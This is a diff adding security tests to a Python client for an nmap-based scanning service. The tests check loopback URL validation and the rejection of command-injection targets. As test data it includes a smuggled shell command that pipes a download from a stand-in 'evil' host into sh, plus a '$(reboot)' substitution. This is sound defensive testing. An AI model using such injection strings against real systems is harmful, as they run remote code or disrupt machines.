@@ -43,7 +43,23 @@ class FakeSession:
 def test_is_loopback() -> None:
     assert is_loopback("http://127.0.0.1:8888")
     assert is_loopback("http://localhost:8888")
+    assert is_loopback("http://127.0.0.5:8888")  # all of 127.0.0.0/8
     assert not is_loopback("http://10.1.1.1:8888")
+    # A substring test used to accept this — the HOST is an attacker, not loopback.
+    assert not is_loopback("http://attacker.example/?localhost")
+    assert not is_loopback("http://127.0.0.1.evil.example:8888")
+
+
+def test_nmap_target_injection_refused() -> None:
+    sess = FakeSession(post_resp=FakeResp(200, {"stdout": _NMAP_XML, "success": True, "return_code": 0}))
+    c = HexStrikeClient(session=sess)
+    with pytest.raises(HexStrikeError):
+        c.nmap_xml("10.0.0.5; curl http://evil/x | sh")
+    with pytest.raises(HexStrikeError):
+        c.nmap_xml("$(reboot)")
+    # A valid target is quoted, not interpolated raw.
+    c.nmap_xml("10.10.10.9")
+    assert "10.10.10.9" in sess.posted["command"]
 
 
 def test_health() -> None:
